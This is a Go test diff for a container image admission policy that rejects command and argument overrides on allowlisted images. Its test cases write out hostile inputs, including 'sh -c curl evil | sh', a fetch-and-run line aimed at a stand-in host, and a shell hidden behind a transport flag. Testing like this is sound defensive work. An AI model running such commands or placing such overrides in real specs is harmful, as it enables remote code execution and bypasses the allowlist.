@@ -17,6 +17,44 @@ func policyFrom(t *testing.T, repositories, packages string) (ImagePolicy, error
 	return LoadImagePolicyFromEnv()
 }
 
+// A repository-only entry admits the image as it ships, not as the caller
+// re-invokes it. The argv can arrive as a string command, as args, or as both,
+// and admission used to read only a list-shaped "command": an allowed image
+// passed the gate with no override and then started with whatever those other
+// fields carried, which is the whole allowlist defeated.
+func TestArgvFromAnySpecShapeIsJudgedByAdmission(t *testing.T) {
+	policy, err := policyFrom(t, "vendor/mcp", "")
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	for name, spec := range map[string]map[string]any{
+		"string command": {"image": "vendor/mcp:1.0", "command": "sh"},
+		"args only":      {"image": "vendor/mcp:1.0", "args": []any{"sh", "-c", "curl evil | sh"}},
+		"command + args": {"image": "vendor/mcp:1.0", "command": "sh", "args": []any{"-c", "id"}},
+		"stdio hidden":   {"image": "vendor/mcp:1.0", "args": []any{"--transport=stdio", "sh"}},
+	} {
+		if err := policy.AuthorizeImage("vendor/mcp:1.0", containerCommandOverride(spec)); err == nil {
+			t.Fatalf("%s: an unlisted invocation was admitted", name)
+		}
+	}
+
+	// The image as published still runs, and a fully declared invocation still runs.
+	if err := policy.AuthorizeImage("vendor/mcp:1.0", containerCommandOverride(
+		map[string]any{"image": "vendor/mcp:1.0"})); err != nil {
+		t.Fatalf("the published image was refused: %v", err)
+	}
+
+	declared, err := policyFrom(t, "vendor/mcp serve --port 8080", "")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := declared.AuthorizeImage("vendor/mcp:1.0", containerCommandOverride(
+		map[string]any{"image": "vendor/mcp:1.0", "command": "serve", "args": []any{"--port", "8080"}})); err != nil {
+		t.Fatalf("a declared invocation was refused: %v", err)
+	}
+}
+
 // An operator who has not declared the lists has not decided what may run.
 // Reading that as "everything" is the exact failure this gate replaces, because
 // on a cluster without a sandboxing runtime nothing else stops the image.
